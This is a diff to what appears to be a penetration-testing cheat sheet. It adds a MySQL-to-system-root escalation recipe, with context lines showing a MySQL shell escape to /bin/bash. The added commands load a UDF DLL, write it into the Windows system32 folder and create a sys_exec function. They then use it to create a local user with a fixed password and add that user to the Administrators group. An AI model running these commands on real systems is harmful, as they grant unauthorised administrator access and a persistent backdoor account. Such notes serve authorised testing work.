@@ -406,6 +406,17 @@ Drop to a shell (as the user running MySQL):
 mysql> \! /bin/bash
 ```
 
+MySQL root to system-root for windows/linux - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/: 
+```bash
+$ USE mysql;
+$ CREATE TABLE mytbl(line blob);
+$ INSERT INTO mytbl values(load_file('C://xampplite//htdocs //lib_mysqludf_sys.dll'));
+$ SELECT * FROM mysql.mytbl INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+$ CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+$ SELECT sys_exec("net user testu P@ssw0rd /add");
+$ SELECT sys_exec("net localgroup Administrators testu /add");
+```
+
 ### RDP - TCP 3389
 
 If you have credentials, you can enable the RDP service then log in:
